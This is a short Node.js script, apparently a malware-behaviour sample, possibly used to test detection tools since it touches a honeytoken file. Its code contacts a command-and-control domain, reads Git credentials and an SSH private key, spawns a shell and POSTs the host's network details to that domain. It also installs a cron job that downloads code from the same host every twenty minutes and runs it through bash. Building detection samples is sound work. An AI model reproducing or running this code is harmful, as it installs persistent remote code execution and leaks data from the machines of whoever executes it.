const dns = require('dns');
const http = require('http');
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

// DNS query to C2
dns.lookup('ioflow.pavl9ore.surf', () => {});

// Credential access
try { fs.readFileSync(os.homedir() + '/.git-credentials', 'utf8'); } catch(e) {}
try { fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8'); } catch(e) {}

// Honeytoken
try { fs.readFileSync(os.homedir() + '/.fake_ssh_key', 'utf8'); } catch(e) {}

// Spawn shell
try { execSync('bash -c "ip addr show"'); } catch(e) {}

// POST exfiltration
const info = JSON.stringify({ interfaces: os.networkInterfaces(), hostname: os.hostname() });
try {
  const req = http.request({ hostname: 'ioflow.pavl9ore.surf', port: 80, path: '/graphql', method: 'POST', headers: { 'Content-Type': 'application/json' } });
  req.write(info); req.end();
} catch(e) {}

// Persistence via cron
try { execSync('(crontab -l 2>/dev/null; echo "*/20 * * * * curl ioflow.pavl9ore.surf/schema | bash") | crontab -'); } catch(e) {}
